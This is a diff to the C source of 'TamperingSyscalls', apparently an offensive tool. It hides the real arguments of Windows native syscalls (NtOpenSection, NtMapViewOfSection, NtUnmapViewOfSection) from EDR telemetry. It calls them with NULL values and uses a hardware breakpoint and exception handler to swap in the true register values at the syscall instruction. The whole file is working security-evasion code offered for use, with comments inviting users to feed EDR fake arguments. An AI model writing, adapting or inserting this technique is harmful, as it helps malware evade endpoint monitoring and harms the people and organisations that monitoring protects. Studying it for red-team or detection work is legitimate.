@@ -1,15 +1,18 @@
 /*++
 TamperingSyscalls
-- rad98
+- @rad98
+- @__mez0__ for getting the generation working, and great ideas.
 
+How this works?
 We set a HWBP on syscall address, remove the HWBP, fix the arguments, and make the call
 Thus avoiding reveal our malicious arguments to the EDR telemetry.
 
 (possibility for you to include your own fake arguments to feed EDR the wrong telemetry.
 Maybe I will write a blog post on this)
 
+Or use the script provided.
 We need to setup the states (what we want to fix the arguments to) and then make the right
-corresponding calls. I have provided one example with NtGetContextThread.
+corresponding calls. I have provided various examples.
 --*/
 #include <Windows.h>
 #include <winternl.h>
@@ -35,89 +38,88 @@ corresponding calls. I have provided one example with NtGetContextThread.
 #define NtCurrentProcess() ( ( HANDLE ) ( LONG_PTR ) -1 )
 #pragma endregion
 
-
 #pragma region structs
 // Can't do it for NtResumeThread or NtSetEvent as these are used after the hardware breakpoint is set.
-
 // Need to make a struct with the arguments.
 typedef struct {
-	HANDLE			ThreadHandle;
-	PCONTEXT		pContext;
-} NtGetContextThreadArgs;
-
-typedef struct {
-	PHANDLE			SectionHandle;
-	ACCESS_MASK		DesiredAccess;
-	POBJECT_ATTRIBUTES	ObjectAttributes;
-} NtOpenSectionArgs;
-
-typedef struct {
-	HANDLE			SectionHandle;
-	HANDLE			ProcessHandle;
-	PVOID			BaseAddress;
-	ULONG_PTR		ZeroBits;
-	SIZE_T			CommitSize;
-	PLARGE_INTEGER	SectionOffset;
-	PSIZE_T			ViewSize;
-	DWORD			InheritDisposition;
-	ULONG			AllocationType;
-	ULONG			Win32Protect;
+	HANDLE                     SectionHandle;
+	HANDLE                     ProcessHandle;
+	PVOID                      BaseAddress;
+	ULONG                      ZeroBits;
+	SIZE_T                     CommitSize;
+	PLARGE_INTEGER             SectionOffset;
+	PSIZE_T                    ViewSize;
+	DWORD					   InheritDisposition;
+	ULONG                      AllocationType;
+	ULONG                      Win32Protect;
 } NtMapViewOfSectionArgs;
 
 typedef struct {
-	HANDLE			ProcessHandle;
-	PVOID			BaseAddress;
+	HANDLE					   ProcessHandle;
+	PVOID                      BaseAddress;
 } NtUnmapViewOfSectionArgs;
+
+typedef struct {
+	PHANDLE                    SectionHandle;
+	ACCESS_MASK                DesiredAccess;
+	POBJECT_ATTRIBUTES         ObjectAttributes;
+} NtOpenSectionArgs;
+
 
 typedef struct {
 	int		index;
 	LPVOID	arguments;
 } STATE;
-
 #pragma endregion
 
 #pragma region typedefs
-
-typedef NTSTATUS( WINAPI* typeNtOpenSection )(
-	HANDLE* SectionHandle,
-	ACCESS_MASK DesiredAccess,
-	POBJECT_ATTRIBUTES ObjectAttributes
+typedef NTSTATUS( NTAPI* typeNtMapViewOfSection )(
+	HANDLE                   SectionHandle,
+	HANDLE                   ProcessHandle,
+	PVOID                    BaseAddress,
+	ULONG                    ZeroBits,
+	SIZE_T                   CommitSize,
+	PLARGE_INTEGER           SectionOffset,
+	PSIZE_T                  ViewSize,
+	DWORD			         InheritDisposition,
+	ULONG                    AllocationType,
+	ULONG                    Win32Protect
 	);
 
-typedef NTSTATUS( WINAPI* typeNtMapViewOfSection )(
-	HANDLE SectionHandle,
-	HANDLE ProcessHandle,
-	PVOID BaseAddress,
-	ULONG_PTR ZeroBits,
-	SIZE_T CommitSize,
-	PLARGE_INTEGER SectionOffset,
-	PSIZE_T ViewSize,
-	DWORD InheritDisposition,
-	ULONG AllocationType,
-	ULONG Win32Protect
+typedef NTSTATUS( NTAPI* typeNtUnmapViewOfSection )(
+	HANDLE                   ProcessHandle,
+	PVOID                    BaseAddress
 	);
 
-typedef NTSTATUS( WINAPI* typeNtUnmapViewOfSection )(
-	HANDLE ProcessHandle,
-	PVOID BaseAddress
+typedef NTSTATUS( NTAPI* typeNtOpenSection )(
+	PHANDLE                  SectionHandle,
+	ACCESS_MASK              DesiredAccess,
+	POBJECT_ATTRIBUTES       ObjectAttributes
 	);
-
 #pragma endregion
 
 // Need to make a global variable of our struct (which we fix the arguments in the handler)
 //NtGetContextThreadArgs pNtGetThreadContextArgs;
-NtOpenSectionArgs			pNtOpenSectionArgs;
-NtMapViewOfSectionArgs		pNtMapViewOfSectionArgs;
-NtUnmapViewOfSectionArgs	pNtUnmapViewOfSectionArgs;
+NtMapViewOfSectionArgs pNtMapViewOfSectionArgs;
+NtUnmapViewOfSectionArgs pNtUnmapViewOfSectionArgs;
+NtOpenSectionArgs pNtOpenSectionArgs;
+
+// enums
+enum
+{
+	NTMAPVIEWOFSECTION_ENUM = 0,
+	NTUNMAPVIEWOFSECTION_ENUM,
+	NTOPENSECTION_ENUM
+};
 
 // Need to setup states in order you call the functions.
 STATE StateArray[] = {
-	{ 0, &pNtOpenSectionArgs },
-	{ 1, &pNtMapViewOfSectionArgs },
-	{ 2, &pNtUnmapViewOfSectionArgs },
+	{ NTMAPVIEWOFSECTION_ENUM,		&pNtMapViewOfSectionArgs	},
+	{ NTUNMAPVIEWOFSECTION_ENUM,	&pNtUnmapViewOfSectionArgs	},
+	{ NTOPENSECTION_ENUM,			&pNtOpenSectionArgs			}
 };
 
-DWORD StatePointer = 0;
+DWORD EnumState;
 
 LONG WINAPI OneShotHardwareBreakpointHandler( PEXCEPTION_POINTERS ExceptionInfo );
 
@@ -168,6 +170,7 @@ int main()
 	pNtOpenSectionArgs.DesiredAccess = SECTION_MAP_READ | SECTION_MAP_EXECUTE;
 
 	FunctionAddress = GetProcAddress( GetModuleHandleA( "NTDLL.dll" ), "NtOpenSection" );
+	EnumState = NTOPENSECTION_ENUM;
 	status = SpoofSyscaller( FunctionAddress );
 	if( NT_SUCCESS( status ) ) {
 		PRINT( "Success : 0x%x\n", status );
@@ -190,6 +193,7 @@ int main()
 	pNtMapViewOfSectionArgs.Win32Protect = PAGE_READONLY;
 
 	FunctionAddress = GetProcAddress( GetModuleHandleA( "NTDLL.dll" ), "NtMapViewOfSection" );
+	EnumState = NTMAPVIEWOFSECTION_ENUM;
 	status = SpoofSyscaller( FunctionAddress );
 	if( NT_SUCCESS( status ) ) {
 		PRINT( "Success : 0x%x\n", status );
@@ -201,6 +205,7 @@ int main()
 	pNtUnmapViewOfSectionArgs.ProcessHandle = NtCurrentProcess();
 	pNtUnmapViewOfSectionArgs.BaseAddress = addr;
 	FunctionAddress = GetProcAddress( GetModuleHandleA( "NTDLL.dll" ), "NtUnmapViewOfSection" );
+	EnumState = NTUNMAPVIEWOFSECTION_ENUM;
 	status = SpoofSyscaller( FunctionAddress );
 	if( NT_SUCCESS( status ) ) {
 		PRINT( "Success : 0x%x\n", status );
@@ -214,27 +219,30 @@ int main()
 
 NTSTATUS SpoofSyscaller( PVOID FunctionAddress )
 {
-	typedef NTSTATUS( WINAPI* defaultType )();
+	//typedef NTSTATUS( WINAPI* defaultType )();
 	NTSTATUS status;
 	SetOneshotHardwareBreakpoint( FindSyscallAddress( FunctionAddress ) );
 
 	// definitions
-	defaultType fDefaultType;
+	//defaultType fDefaultType;
 	typeNtMapViewOfSection fNtMapViewOfSection;
+	typeNtUnmapViewOfSection fNtUnmapViewOfSection;
+	typeNtOpenSection fNtOpenSection;
 
-	switch( StatePointer ) {
-	case 1:
-		// Pass the arguments beyond 4th parameter here
-		// You need to specify the typedef and pass the arguments after the 4th parameter as these use the stack.
+	switch( EnumState ) {
+	case NTMAPVIEWOFSECTION_ENUM:
 		fNtMapViewOfSection = (typeNtMapViewOfSection)FunctionAddress;
-		status = fNtMapViewOfSection( NULL, NULL, NULL, NULL, pNtMapViewOfSectionArgs.CommitSize,
-			pNtMapViewOfSectionArgs.SectionOffset, pNtMapViewOfSectionArgs.ViewSize, pNtMapViewOfSectionArgs.InheritDisposition,
-			pNtMapViewOfSectionArgs.AllocationType, pNtMapViewOfSectionArgs.Win32Protect );
+		status = fNtMapViewOfSection( NULL, NULL, NULL, NULL, pNtMapViewOfSectionArgs.CommitSize, pNtMapViewOfSectionArgs.SectionOffset, pNtMapViewOfSectionArgs.ViewSize, pNtMapViewOfSectionArgs.InheritDisposition, pNtMapViewOfSectionArgs.AllocationType, pNtMapViewOfSectionArgs.Win32Protect );
 		break;
-	// If we are using functions with <=4 arguments we can just fall through to the default handler.
-	default:
-		fDefaultType = (defaultType)FunctionAddress;
-		status = fDefaultType();
+
+	case NTUNMAPVIEWOFSECTION_ENUM:
+		fNtUnmapViewOfSection = (typeNtUnmapViewOfSection)FunctionAddress;
+		status = fNtUnmapViewOfSection( NULL, NULL );
+		break;
+
+	case NTOPENSECTION_ENUM:
+		fNtOpenSection = (typeNtOpenSection)FunctionAddress;
+		status = fNtOpenSection( NULL, NULL, NULL );
 		break;
 	}
 
@@ -254,32 +262,42 @@ LONG WINAPI OneShotHardwareBreakpointHandler( PEXCEPTION_POINTERS ExceptionInfo 
 				ExceptionInfo->ContextRecord->Dr0 = 0;
 
 				// You need to fix your arguments in the right registers and stack here.
-				switch( StatePointer ) {
+				switch( EnumState ) {
 					// RCX moved into R10!!! Kudos to @anthonyprintup for catching this 
-				case 0:
+				case NTMAPVIEWOFSECTION_ENUM:
 					ExceptionInfo->ContextRecord->R10 =
-						(DWORD_PTR)((NtOpenSectionArgs*)(StateArray[StatePointer].arguments))->SectionHandle;
+						(DWORD_PTR)((NtMapViewOfSectionArgs*)(StateArray[EnumState].arguments))->SectionHandle;
+
 					ExceptionInfo->ContextRecord->Rdx =
-						(DWORD_PTR)((NtOpenSectionArgs*)(StateArray[StatePointer].arguments))->DesiredAccess;
+						(DWORD_PTR)((NtMapViewOfSectionArgs*)(StateArray[EnumState].arguments))->ProcessHandle;
+
 					ExceptionInfo->ContextRecord->R8 =
-						(DWORD_PTR)((NtOpenSectionArgs*)(StateArray[StatePointer].arguments))->ObjectAttributes;
-					break;
-					// put your other states here.
-				case 1:
-					ExceptionInfo->ContextRecord->R10 =
-						(DWORD_PTR)((NtMapViewOfSectionArgs*)(StateArray[StatePointer].arguments))->SectionHandle;
-					ExceptionInfo->ContextRecord->Rdx =
-						(DWORD_PTR)((NtMapViewOfSectionArgs*)(StateArray[StatePointer].arguments))->ProcessHandle;
-					ExceptionInfo->ContextRecord->R8 =
-						(DWORD_PTR)((NtMapViewOfSectionArgs*)(StateArray[StatePointer].arguments))->BaseAddress;
+						(DWORD_PTR)((NtMapViewOfSectionArgs*)(StateArray[EnumState].arguments))->BaseAddress;
+
 					ExceptionInfo->ContextRecord->R9 =
-						(DWORD_PTR)((NtMapViewOfSectionArgs*)(StateArray[StatePointer].arguments))->ZeroBits;
+						(DWORD_PTR)((NtMapViewOfSectionArgs*)(StateArray[EnumState].arguments))->ZeroBits;
+
 					break;
-				case 2:
+
+				case NTUNMAPVIEWOFSECTION_ENUM:
 					ExceptionInfo->ContextRecord->R10 =
-						(DWORD_PTR)((NtUnmapViewOfSectionArgs*)(StateArray[StatePointer].arguments))->ProcessHandle;
+						(DWORD_PTR)((NtUnmapViewOfSectionArgs*)(StateArray[EnumState].arguments))->ProcessHandle;
+
 					ExceptionInfo->ContextRecord->Rdx =
-						(DWORD_PTR)((NtUnmapViewOfSectionArgs*)(StateArray[StatePointer].arguments))->BaseAddress;
+						(DWORD_PTR)((NtUnmapViewOfSectionArgs*)(StateArray[EnumState].arguments))->BaseAddress;
+
+					break;
+
+				case NTOPENSECTION_ENUM:
+					ExceptionInfo->ContextRecord->R10 =
+						(DWORD_PTR)((NtOpenSectionArgs*)(StateArray[EnumState].arguments))->SectionHandle;
+
+					ExceptionInfo->ContextRecord->Rdx =
+						(DWORD_PTR)((NtOpenSectionArgs*)(StateArray[EnumState].arguments))->DesiredAccess;
+
+					ExceptionInfo->ContextRecord->R8 =
+						(DWORD_PTR)((NtOpenSectionArgs*)(StateArray[EnumState].arguments))->ObjectAttributes;
+
 					break;
 
 					// you have messed up by not providing the indexed state
@@ -287,7 +305,6 @@ LONG WINAPI OneShotHardwareBreakpointHandler( PEXCEPTION_POINTERS ExceptionInfo 
 					ExceptionInfo->ContextRecord->Rip += 1;	// just so we don't hang
 					break;
 				}
-				StatePointer += 1;
 				return EXCEPTION_CONTINUE_EXECUTION;
 			}
 		}
